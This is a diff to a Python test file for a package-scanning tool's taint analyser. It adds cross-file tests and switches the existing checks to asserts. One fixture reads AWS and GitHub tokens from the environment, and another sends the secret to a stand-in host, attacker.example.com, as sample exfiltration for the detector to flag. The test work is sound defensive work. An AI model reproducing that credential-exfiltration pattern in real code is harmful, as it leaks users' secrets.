@@ -8,6 +8,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
 from pkgsentinel.stages.taint_slicer import (
     analyze_python,
+    analyze_python_cross_file,
     slice_for_llm,
 )
 
@@ -68,23 +69,18 @@ def test_malicious():
             print(f"    transforms={f.transforms}")
 
     expected_min = 2  # 최소 두 가지 흐름은 잡혀야 함
-    if len(rpt.flows) >= expected_min:
-        print(f"  OK (>= {expected_min} flows)")
-    else:
-        print(f"  FAIL (expected >= {expected_min}, got {len(rpt.flows)})")
-        return False
-    return True
+    assert len(rpt.flows) >= expected_min, \
+        f"expected >= {expected_min}, got {len(rpt.flows)}"
+    print(f"  OK (>= {expected_min} flows)")
 
 
 def test_benign():
     rpt = analyze_python(BENIGN_SAMPLE)
     print(f"\n[BENIGN] flows: {len(rpt.flows)}")
-    if not rpt.flows:
-        print("  OK - taint flow 없음")
-        return True
     for f in rpt.flows:
         print(f"  FAIL: unexpected flow {f.to_summary()}")
-    return False
+    assert not rpt.flows
+    print("  OK - taint flow 없음")
 
 
 def test_slice_format():
@@ -92,19 +88,79 @@ def test_slice_format():
     sliced = slice_for_llm(MALICIOUS_SAMPLE, rpt.flows)
     print(f"\n[SLICE] length: {len(sliced)} chars")
     print(sliced[:600])
-    if "Flow #1" in sliced and "->" in sliced:
-        print("  OK - slice 포맷 정상")
-        return True
-    print("  FAIL - 포맷 이상")
-    return False
+    assert "Flow #1" in sliced and "->" in sliced, "포맷 이상"
+    print("  OK - slice 포맷 정상")
+
+
+# ─────────────── cross-file ───────────────
+
+CROSS_CONFIG = '''
+import os
+SECRET = os.environ.get("AWS_KEY")
+TOKEN = os.environ.get("GITHUB_TOKEN")
+NORMAL = "hello"
+'''
+
+CROSS_USER = '''
+import requests
+from mypkg.config import SECRET, NORMAL
+
+def upload():
+    requests.post("https://attacker.example.com", data=SECRET)
+    requests.get("https://api.example.com", params={"hi": NORMAL})  # 정상
+'''
+
+
+def test_cross_file_basic():
+    print("\n[CROSS-FILE] config exports SECRET, user imports + sinks")
+    sources = {
+        "mypkg/config.py": CROSS_CONFIG,
+        "mypkg/user.py": CROSS_USER,
+    }
+    reports = analyze_python_cross_file(sources)
+    user_flows = reports["mypkg/user.py"].flows
+    print(f"  user.py flows: {len(user_flows)}")
+    for f in user_flows:
+        print(f"    - {f.to_summary()} (var={f.tainted_var})")
+    # cross-file 마커 또는 SECRET sink 흐름이 있어야
+    assert any(
+        f.tainted_var == "SECRET" and "requests.post" in f.sink_call
+        for f in user_flows
+    ), f"expected SECRET→requests.post flow, got {user_flows}"
+    # NORMAL 은 source 가 아니라 흐름 없어야
+    assert not any(f.tainted_var == "NORMAL" for f in user_flows)
+    print("  OK")
+
+
+def test_cross_file_no_match():
+    """import 가 다른 모듈을 가리키면 taint 가 흐르지 않아야."""
+    print("\n[CROSS-FILE] mismatched import → no flow")
+    sources = {
+        "mypkg/config.py": CROSS_CONFIG,
+        "mypkg/user.py": '''
+import requests
+from someother.module import SECRET
+requests.post("https://x.com", data=SECRET)
+''',
+    }
+    reports = analyze_python_cross_file(sources)
+    flows = reports["mypkg/user.py"].flows
+    assert not flows, f"unexpected cross-file flow: {flows}"
+    print("  OK no flow propagated to wrong import target")
 
 
 def main():
-    ok = True
-    ok &= test_malicious()
-    ok &= test_benign()
-    ok &= test_slice_format()
-    print("\n" + ("ALL OK" if ok else "FAILED"))
+    tests = [test_malicious, test_benign, test_slice_format,
+             test_cross_file_basic, test_cross_file_no_match]
+    failed = 0
+    for t in tests:
+        try:
+            t()
+        except Exception:
+            import traceback
+            traceback.print_exc()
+            failed += 1
+    print("\n" + ("ALL OK" if failed == 0 else f"FAILED: {failed}"))
 
 
 if __name__ == "__main__":
